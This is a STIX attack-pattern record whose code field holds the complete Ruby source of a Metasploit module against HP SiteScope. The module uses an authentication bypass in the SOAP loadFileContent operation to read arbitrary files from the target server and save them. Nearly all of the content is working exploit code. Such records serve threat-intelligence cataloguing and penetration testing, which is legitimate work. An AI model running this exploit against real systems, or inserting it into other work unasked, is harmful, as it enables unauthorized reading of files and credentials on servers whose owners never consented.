{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--5cb25f85-929e-4f11-9b7a-5c88abba41c1",
    "created": "2024-08-14T16:30:44.331674Z",
    "modified": "2024-08-14T16:30:44.331678Z",
    "name": "HP SiteScope SOAP Call loadFileContent Remote File Access",
    "description": " This module exploits an authentication bypass vulnerability in HP SiteScope to retrieve an arbitrary text file from the remote server. It is accomplished by calling the loadFileContent operation available through the APIMonitorImpl AXIS service. This module has been successfully tested on HP SiteScope 11.20 over Windows 2003 SP2 and Linux Centos 6.3.  'References'   => [ [ 'OSVDB', '85118' ] [ 'BID', '55269' ] [ 'ZDI', '12-177' ] ]",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/hp_sitescope_loadfilecontent_fileaccess.rb",
            "external_id": "hp_sitescope_loadfilecontent_fileaccess.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n\n  def initialize\n    super(\n      'Name'         => 'HP SiteScope SOAP Call loadFileContent Remote File Access',\n      'Description'  =>  %q{\n          This module exploits an authentication bypass vulnerability in HP SiteScope to\n        retrieve an arbitrary text file from the remote server. It is accomplished by\n        calling the loadFileContent operation available through the APIMonitorImpl AXIS\n        service. This module has been successfully tested on HP SiteScope 11.20 over\n        Windows 2003 SP2 and Linux Centos 6.3.\n      },\n      'References'   =>\n        [\n          [ 'OSVDB', '85118' ],\n          [ 'BID', '55269' ],\n          [ 'ZDI', '12-177' ]\n        ],\n      'Author'       =>\n        [\n          'rgod <rgod[at]autistici.org>', # Vulnerability discovery\n          'juan vazquez' # Metasploit module\n        ],\n      'License'      => MSF_LICENSE\n    )\n\n    register_options(\n    [\n      Opt::RPORT(8080),\n      OptString.new('RFILE', [true, 'Remote File', 'c:\\\\windows\\\\win.ini']),\n      OptString.new('TARGETURI', [true, 'Path to SiteScope', '/SiteScope/']),\n    ])\n\n    register_autofilter_ports([ 8080 ])\n  end\n\n  def run_host(ip)\n    @uri = normalize_uri(target_uri.path)\n    @uri << '/' if @uri[-1,1] != '/'\n\n    print_status(\"Connecting to SiteScope SOAP Interface\")\n\n    uri = normalize_uri(@uri, 'services/APIMonitorImpl')\n\n    res = send_request_cgi({\n      'uri'     => uri,\n      'method'  => 'GET'})\n\n    if not res\n      print_error(\"Unable to connect\")\n      return\n    end\n\n    accessfile\n  end\n\n  def accessfile\n\n    data = \"<?xml version='1.0' encoding='UTF-8'?>\" + \"\\r\\n\"\n    data << \"<wsns0:Envelope\" + \"\\r\\n\"\n    data << \"xmlns:wsns1='http://www.w3.org/2001/XMLSchema-instance'\" + \"\\r\\n\"\n    data << \"xmlns:xsd='http://www.w3.org/2001/XMLSchema'\" + \"\\r\\n\"\n    data << \"xmlns:wsns0='http://schemas.xmlsoap.org/soap/envelope/'\" + \"\\r\\n\"\n    data << \">\" + \"\\r\\n\"\n    data << \"<wsns0:Body\" + \"\\r\\n\"\n    data << \"wsns0:encodingStyle='http://schemas.xmlsoap.org/soap/encoding/'\" + \"\\r\\n\"\n    data << \">\" + \"\\r\\n\"\n    data << \"<impl:loadFileContent\" + \"\\r\\n\"\n    data << \"xmlns:impl='http://Api.freshtech.COM'\" + \"\\r\\n\"\n    data << \">\" + \"\\r\\n\"\n    data << \"<in0\" + \"\\r\\n\"\n    data << \"xsi:type='xsd:string'\" + \"\\r\\n\"\n    data << \"xmlns:xsi='http://www.w3.org/2001/XMLSchema-instance'\" + \"\\r\\n\"\n    data << \">#{datastore['RFILE']}</in0>\" + \"\\r\\n\"\n    data << \"</impl:loadFileContent>\" + \"\\r\\n\"\n    data << \"</wsns0:Body>\" + \"\\r\\n\"\n    data << \"</wsns0:Envelope>\" + \"\\r\\n\"\n\n    print_status(\"Retrieving the file contents\")\n\n    uri = normalize_uri(@uri, 'services/APIMonitorImpl')\n\n    res = send_request_cgi({\n      'uri'      => uri,\n      'method'   => 'POST',\n      'ctype'    => 'text/xml; charset=UTF-8',\n      'data'     => data,\n      'headers'  => {\n        'SOAPAction'    => '\"\"',\n      }})\n\n    if res and res.code == 200 and res.body =~ /<loadFileContentReturn xsi:type=\"xsd:string\">(.*)<\\/loadFileContentReturn>/m\n      loot = CGI.unescapeHTML($1)\n      if not loot or loot.empty?\n        print_status(\"Retrieved empty file\")\n        return\n      end\n      f = ::File.basename(datastore['RFILE'])\n      path = store_loot('hp.sitescope.file', 'application/octet-stream', rhost, loot, f, datastore['RFILE'])\n      print_good(\"#{datastore['RFILE']} saved in #{path}\")\n      return\n    end\n\n    print_error(\"Failed to retrieve the file\")\n  end\nend\n\n"
}